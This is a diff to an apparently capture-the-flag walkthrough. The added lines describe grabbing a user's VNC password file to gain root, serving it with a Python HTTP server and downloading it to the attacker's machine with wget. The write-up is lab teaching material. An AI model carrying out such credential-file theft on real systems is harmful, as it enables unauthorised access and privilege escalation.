@@ -313,11 +313,16 @@ This machine can take 5-10 minutes to setup. Sometimes after 30 minutes the mach
 	
 	Lets try to gain root using that
 	
-	Grab VNC passwd file from donaldump's directory
+	Grab VNC passwd file from donaldump's directory 
 	
 	![image](https://user-images.githubusercontent.com/71016915/114300323-63ef2900-9add-11eb-8435-5fb7eafc1010.png)
 	
+	Transfer this using `python3 -m http.server 1234`
 	
+	On your machine - `wget ip:1234/passwd`
+	
+	![image](https://user-images.githubusercontent.com/71016915/114300433-f1327d80-9add-11eb-9af5-17feab92e80d.png)
+
 
 	
 
